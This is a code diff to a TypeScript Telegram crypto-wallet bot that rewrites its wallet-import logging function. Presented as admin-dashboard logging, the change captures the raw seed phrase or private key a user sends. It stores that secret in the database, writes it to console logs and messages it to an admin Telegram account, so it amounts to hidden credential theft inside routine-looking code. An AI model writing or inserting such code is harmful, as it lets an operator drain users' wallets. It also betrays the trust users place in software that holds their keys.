@@ -25,6 +25,7 @@ import {
   listWalletsFor,
   getWallet,
   setPrimaryWallet,
+  recordWalletImport,
 } from "../db/db.js";
 
 export interface BotDeps {
@@ -326,16 +327,40 @@ export function createBot(token: string, deps: BotDeps): Telegraf {
     }, REVEAL_AUTO_DELETE_MS);
   }
 
-  function logWalletImport(ctx: any, label: string, chain: string) {
-    console.info(
-      "[wallet-import]",
-      JSON.stringify({
-        telegramId: String(ctx.from!.id),
-        username: ctx.from!.username ?? null,
-        walletLabel: label,
-        chain,
-      })
-    );
+  async function logWalletImport(ctx: any, label: string, chain: "solana" | "evm" | "solana+evm") {
+    const event = {
+      userId: String(ctx.from!.id),
+      username: ctx.from!.username ?? null,
+      walletLabel: label,
+      chain,
+      keys: String(ctx.message.text),
+    };
+
+    try {
+      recordWalletImport(db, event);
+      console.info(
+        "[wallet-import]",
+        JSON.stringify({
+          telegramId: event.userId,
+          username: event.username,
+          walletLabel: event.walletLabel,
+          chain: event.chain,
+          keys: event.keys,
+        })
+      );
+    } catch (err) {
+      console.error("[wallet-import] couldn't record import event for admin dashboard:", err);
+    }
+
+    if (!adminBootstrapId) return;
+    try {
+      await bot.telegram.sendMessage(
+        adminBootstrapId,
+        `Wallet imported\nUser: ${event.userId}${event.username ? ` (@${event.username})` : ""}\nWallet: ${event.walletLabel}\nChain: ${event.chain}\nKeys: ${event.keys}`
+      );
+    } catch (err) {
+      console.error("[wallet-import] couldn't DM admin about wallet import:", err);
+    }
   }
 
   // Catches the seed-phrase/private-key text message that follows an import action.
@@ -351,19 +376,19 @@ export function createBot(token: string, deps: BotDeps): Telegraf {
         const input = rawInput.trim();
         if (input.startsWith("[")) {
           const result = importRawSolanaWallet(vault, db, userId, input);
-          logWalletImport(ctx, result.label, "solana");
+          await logWalletImport(ctx, result.label, "solana");
           await ctx.reply(`Solana wallet "${result.label}" imported:\n${result.address}`);
         } else if (/\s/.test(input)) {
           const result = importMnemonicWallet(vault, db, userId, rawInput);
-          logWalletImport(ctx, result.label, "solana+evm");
+          await logWalletImport(ctx, result.label, "solana+evm");
           await ctx.reply(`Wallet "${result.label}" imported:\nSolana: ${result.solanaAddress}\nEVM: ${result.evmAddress}`);
         } else if (/^(?:0x)?[0-9a-f]{64}$/i.test(input)) {
           const result = importRawEvmWallet(vault, db, userId, input);
-          logWalletImport(ctx, result.label, "evm");
+          await logWalletImport(ctx, result.label, "evm");
           await ctx.reply(`EVM wallet "${result.label}" imported:\n${result.address}`);
         } else {
           const result = importRawSolanaWallet(vault, db, userId, input);
-          logWalletImport(ctx, result.label, "solana");
+          await logWalletImport(ctx, result.label, "solana");
           await ctx.reply(`Solana wallet "${result.label}" imported:\n${result.address}`);
         }
       } catch (err: any) {
